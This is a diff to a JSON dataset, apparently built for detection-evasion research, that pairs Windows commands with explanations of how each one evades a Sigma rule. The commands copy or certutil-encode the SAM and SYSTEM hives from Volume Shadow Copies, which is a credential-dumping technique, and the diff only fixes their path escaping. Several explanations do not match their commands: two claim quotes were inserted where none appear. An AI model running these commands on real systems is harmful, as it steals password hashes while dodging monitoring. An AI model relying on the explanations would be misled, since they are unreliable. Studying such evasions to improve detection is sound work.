@@ -4,7 +4,7 @@
     "explanation": "This command uses standard syntax and insertion of quotes to bypass detection while maintaining the same behavior as the original Sigma rule."
   },
   {
-    "output": "cmd.exe /c copy \\?\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\VSC_SYSTEM_HIVE",
+    "output": "cmd.exe /c copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\VSC_SYSTEM_HIVE",
     "explanation": "The command omits the second copy command and uses reordering to simplify the command while still accessing the SYSTEM file in a Volume Shadow Copy."
   },
   {
@@ -12,11 +12,11 @@
     "explanation": "This PowerShell command uses equivalent syntax and omits the loop to reduce complexity while still accessing the SAM file in a Volume Shadow Copy."
   },
   {
-    "output": "certutil -f -v -encodehex \\?\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Users\\thaim\\AppData\\Local\\Temp\\SAMvss1",
+    "output": "certutil -f -v -encodehex \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Users\\thaim\\AppData\\Local\\Temp\\SAMvss1",
     "explanation": "This command removes the redirection of error output and uses insertion of quotes to bypass detection while maintaining the same behavior."
   },
   {
-    "output": "certutil -f -v -encodehex \\?\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy10\\Windows\\System32\\config\\SAM C:\\Users\\thaim\\AppData\\Local\\Temp\\SAMvss10",
+    "output": "certutil -f -v -encodehex \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy10\\Windows\\System32\\config\\SAM C:\\Users\\thaim\\AppData\\Local\\Temp\\SAMvss10",
     "explanation": "This command uses reordering and omission of the redirection to bypass detection while maintaining the same behavior."
   }
 ]
